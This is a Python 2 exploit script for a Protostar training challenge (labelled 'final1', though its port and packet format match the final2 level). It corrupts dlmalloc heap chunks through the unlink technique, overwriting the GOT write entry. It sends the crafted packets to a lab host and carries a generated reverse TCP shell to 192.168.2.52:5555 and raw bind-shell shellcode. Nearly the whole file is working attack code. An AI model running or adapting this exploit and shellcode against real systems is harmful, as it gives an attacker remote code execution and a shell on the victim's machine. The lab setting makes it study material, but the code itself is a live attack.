#!/usr/bin/python
# coding: UTF-8

from socket import *
import struct, shellgen

#exploit-exercises.com : Protostar : final1
# do:
#   dlmalloc heap chunk corruption
#   use unlink() technique to get flow control
#
#usefull:
#
# first calloc return 0x0804e008 ptr
# after free my data was safe in 0x0804e010 - bk
# .got.plt _write: 0x0804D41C - 12 = 0x0804d410 - fd

check = 'FSRD'
valid = '/ROOT'
padding = 'A'*( 119 - len( check + valid ) ) + '/' + 'A'*7 + '\x00'
pkt = check + valid + padding

#vector:
#1st chunk:
#[ FSRD | nop x 4 | nops + jmp | PPPP | nops + shellcode + / ]
#                                                            |
#                                                            |
#2nd chunk:                                                  |
#[ FSRD | ROOT | / + \xfc\xff\xff\xff +                      |
#                    \xfc\xff\xff\xff +                      |
#                    \x10\xd4\x04\x08 +                      |
#                    \x10\xe0\x04\x08 + \x00 | P A D D I N G ]
#                                                            |
#                                                           128

chusion = '\x90\x90\x90\x90\x90\xeb\x05\x90\x41\x41\x41\x41\x90\x90\x90\x90'

revtcp = shellgen.linux().reverse_tcp('192.168.2.52', 5555)

bind = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a" +\
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68" + \
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1" + \
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd" + \
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f" + \
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f" + \
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" + \
"\x41\xcd\x80\x90\x90\x90";

print 'len bind: ', len(bind)

print 'len revtcp: ', len(revtcp)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.2.26', 2993))

chUno = check + chusion + revtcp
chUno += '\x90'*(127 - len(chUno)) + '/'

chTwo = check + 'ROOT' + '/' +  '\xfc\xff\xff\xff' + \
                                '\xfc\xff\xff\xff' + \
                                '\x10\xd4\x04\x08' + \
                                '\x10\xe0\x04\x08' + '\x00'
chTwo += '\x90'*(128 - len(chTwo))

print chUno
print 'len chUno: ', len(chUno)
s.send(chUno)

print chTwo
print 'len chTwo: ', len(chTwo)
s.send(chTwo)

exit()
